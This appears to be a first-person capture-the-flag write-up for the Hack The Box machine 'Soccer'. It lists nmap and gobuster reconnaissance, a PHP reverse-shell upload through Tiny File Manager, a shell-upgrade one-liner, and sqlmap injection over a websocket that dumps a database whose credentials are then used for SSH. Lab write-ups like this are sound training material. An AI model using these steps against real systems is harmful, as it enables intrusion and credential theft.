Started with 'ping 10.10.11.194 -c 4' to make sure my vpn is up and machine is available.
'nmap -p- -T4 10.10.11.194' to see which ports are open. Ports 22, 80 and 9091 were open so i scanned them again with 'nmap -sVC -p 22,80,9091 10.10.11.194' 
for better understanding of versions running in the backend. 
Added '10.10.11.194 soccer.htb' to my hosts file for website to work.

'gobuster dir -u http://soccer.htb -w /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt' found that there is '/tiny' directory which has a login page.
It is a Tiny file manager 2.4.3 which is vulnerable to path traversal.

I didn't have upload rights to '/' but I was able to upload to '/uploads'. Uploaded a reverse shell and then went to 'http://soccer.htb/tiny/uploads/php-reverse.php' to execute it.
Checked the python version and upgraded my shell with:
python3 -c 'import pty; pty.spawn("/bin/bash")'
CTRL + Z
stty raw -echo && fg

I didn't have access to read 'flag.txt' in player's home folder but I found a 'TODO' file from '/tmp' and saved it for later.
'find / -name *player* 2>/dev/null' to find more interesting and there seems to be a subdomain.
Added '10.10.11.194 soc-player.soccer.htb' to '/etc/hosts' for site to work.
There seems to be a lot more that the main site. Like login page, tickets and match pages.

I tried logging in with 'dag@wieers.com' that was in 'TODO' file but didn't get in with most common passwords.
Registered to the site and had a look at the source code. There is a script that connects to websocket at port 9091 that I found in the initial nmap scan.

There was a handy tool 'sqlmap-websocket-proxy' that allows to use sqlmap againts websockets.
'sqlmap-websocket-proxy -u ws://soc-player.soccer.htb:9091 -o 8080 -p '{"id": "%param%"}' --json' to start the proxy.
'/usr/share/sqlmap/sqlmap.py -u http://localhost:8080/?param1=1 --dump-all' to start sqlmap enumeration.
It found databases 'information_schema, mysql, performance_schema, soccer_db, sys'
I then continued to use sqlmap to find tables from 'soccer_db' which were '4, email, id, password, username'
Sqlmap enumerated contents of the tables which took a while.

Ssh in to the box with credentials from the 'soccer_db'
